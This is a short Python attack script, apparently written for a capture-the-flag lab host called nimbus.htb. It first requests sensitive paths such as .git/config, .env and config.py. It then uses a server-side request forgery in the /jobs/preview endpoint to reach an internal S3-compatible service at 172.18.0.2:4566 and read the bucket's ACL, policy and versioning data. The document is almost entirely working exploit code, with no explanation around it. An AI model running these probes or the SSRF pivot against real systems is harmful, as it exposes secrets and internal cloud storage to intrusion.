import requests

print("=== direct web paths ===")
paths = [".git/config", ".env", "app.py", "static/", "server.py", "config.py",
         "requirements.txt", ".git/HEAD", "nimbus.py", "wsgi.py"]
for p in paths:
    r = requests.get(f"http://nimbus.htb/{p}", timeout=8)
    print(f"{p:20s} -> {r.status_code} len={len(r.text)}")

print("=== S3 bucket sub-resources via SSRF ===")
for sub in ["?acl", "?policy", "?location", "?versioning"]:
    u = f"http://172.18.0.2:4566/nimbus-dev-artifacts/{sub}&x=.yaml"
    r = requests.post("http://nimbus.htb/jobs/preview", data={"url": u}, timeout=15)
    i = r.text.find("Raw response")
    print(sub, "->", r.text[i:i+300].replace("\n", " "))
